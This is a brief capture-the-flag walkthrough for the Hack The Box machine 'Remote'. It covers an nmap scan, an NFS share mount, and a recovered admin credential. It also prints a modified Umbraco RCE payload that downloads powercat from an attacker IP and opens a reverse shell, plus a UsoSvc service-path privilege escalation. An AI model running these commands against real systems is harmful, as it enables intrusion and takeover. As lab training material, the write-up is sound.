# Remote

### Nmap

```
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
```

### FTP Enum

```bash
# cant upload through passive mode
```

### Web Enum

```
http://10.10.10.180/umbraco/#/login -> login page

http://10.10.10.180/master

http://10.10.10.180/product

```

### Exploitation

```bash

# show mountable directory
showmount -e $IP

# mount directory to our machine
sudo mount -t nfs $IP:/site_backups /mnt/remote -o nolock

# found login credential on /App_Data/Umbraco.sdf 
admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

# found version Umbraco version 7.12.4 exploit
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution  | aspx/webapps/46153.py

# modify script to get shell
string cmd = "IEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.23/powercat.ps1\');powercat -c 10.10.14.23 -p 443 -e cmd"; 
proc.StartInfo.FileName = "powershell.exe";
```

### Priv Esc

```bash
# stop service
sc.exe stop UsoSvc

# reconfigure usosvc path
sc.exe config usosvc binPath="C:\path\to\payload.exe"

# check config
sc.exe qc usosvc

# start service and execute payload
sc.exe start UsoSvc
```